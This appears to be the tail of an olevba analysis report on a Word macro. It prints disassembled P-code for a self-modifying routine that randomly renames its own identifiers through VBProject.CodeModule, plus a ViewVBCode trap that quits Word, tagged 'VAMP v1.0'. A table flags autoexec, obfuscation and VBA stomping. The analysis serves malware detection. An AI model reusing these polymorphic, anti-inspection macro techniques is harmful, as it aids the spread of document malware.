' 	LitStr 0x0006 "CM9031"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "OT7120"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0005 "HV823"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "BN320"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "VN151"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KD5741"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "HD853"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "FS9162"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "LP6860"
' 	LitDI2 0x000F 
' 	ArgsSt r1 0x0001 
' Line #93:
' 	StartForVariable 
' 	Ld LP6860 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #94:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #95:
' 	Ld a1 
' 	Ld LP6860 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) KM6385 0x0002 
' Line #96:
' 	StartForVariable 
' 	Ld LP6860 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	EndFunc 
' 	QuoteRem 0x000D 0x0017 "VAMP v1.0 [thanks Vic!]"
' Line #98:
' 	FuncDefn (Private Function KM6385(FS9162, HD853 As String, id_FFFE As Variant))
' Line #99:
' 	OnError (Resume Next) 
' Line #100:
' 	Dim 
' 	VarDefn FD8988 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn UP8720 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn IG4087 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn TL7973 (As Long)
' Line #101:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #102:
' 	LitDI2 0x0001 
' 	St FD8988 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St UP8720 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St IG4087 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St TL7973 
' Line #103:
' 	Ld HD853 
' 	Ld FD8988 
' 	Ld UP8720 
' 	Ld IG4087 
' 	Ld TL7973 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #104:
' 	Ld FD8988 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #105:
' 	Ld strline 
' 	Ld UP8720 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld FS9162 
' 	Concat 
' 	Ld strline 
' 	Ld TL7973 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #106:
' 	Ld FD8988 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #107:
' 	Ld IG4087 
' 	LitDI2 0x0001 
' 	Add 
' 	St FD8988 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St UP8720 
' 	BoS 0x0000 
' Line #108:
' 	MemLdWith CountOfLines 
' 	St IG4087 
' Line #109:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St TL7973 
' Line #110:
' 	FuncDefn (Sub ViewVBCode())
' Line #111:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #112:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

